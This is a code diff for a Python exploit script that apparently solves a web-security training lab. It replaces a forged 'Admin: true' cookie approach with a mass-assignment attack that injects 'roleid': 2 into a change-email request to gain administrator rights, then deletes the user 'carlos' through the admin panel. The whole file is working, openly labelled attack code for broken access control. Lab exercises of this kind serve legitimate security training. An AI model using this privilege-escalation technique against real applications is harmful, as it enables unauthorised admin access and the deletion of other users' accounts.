@@ -1,7 +1,6 @@
 import requests
 import sys
 import urllib3
-from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -11,25 +10,9 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def get_csrf_token(url, session):
-    response = session.get(
-        url,
-        verify=False,
-        proxies=proxies)
-    html = BeautifulSoup(
-        response.text,
-        'html.parser')
-    csrf = html.find(
-        "input", {'name': 'csrf'})['value']
-    return csrf
-
 def is_login_successful(url, session):
     login_url = url + "/login"
-    csrf_token = get_csrf_token(
-         login_url,
-         session)
     data = {
-    "csrf": csrf_token,
     "username": "wiener",
     "password": "peter"}
     response = session.post(
@@ -39,25 +22,26 @@ def is_login_successful(url, session):
          proxies=proxies)
     return "Log out" in response.text
 
+def is_change_role_successful(url, session):
+    change_email_url = (
+            url + "/my-account/change-email")
+    data_role_change = {
+            "email":"test@test.ca",
+            "roleid": 2}
+    response = session.post(
+            change_email_url,
+            json=data_role_change,
+            verify=False,
+            proxies=proxies)
+    return 'Admin' in response.text
+
 def is_delete_carlos_successful(url, session):
-    my_account_url = url + "/my-account"
-    response = session.get(
-        my_account_url,
-        verify=False,
-        proxies=proxies)
-    session_cookie = (
-    response.cookies
-        .get_dict()
-        .get('session'))
     delete_carlos_user_url = (
         url + "/admin/delete?username=carlos")
-    cookies = {
-        'Admin': 'true',
-        'session': session_cookie}
-    response = requests.get(
+    response = session.get(
         delete_carlos_user_url,
-        cookies=cookies, 
-        verify=False, proxies=proxies)
+        verify=False,
+        proxies=proxies)
     return response.status_code == 200
 
 if __name__ == "__main__":
@@ -67,6 +51,9 @@ if __name__ == "__main__":
         print("[+] Starting Access Control attack...")
         if not is_login_successful(url, session):
             print("[-] Login was not successful.")
+            sys.exit(FAIL)
+        if not is_change_role_successful(url, session):
+            print("[-] Changing role was not successful.")
             sys.exit(FAIL)
         if not is_delete_carlos_successful(url, session):
             print("[-] Deleting carlos was not successful.")
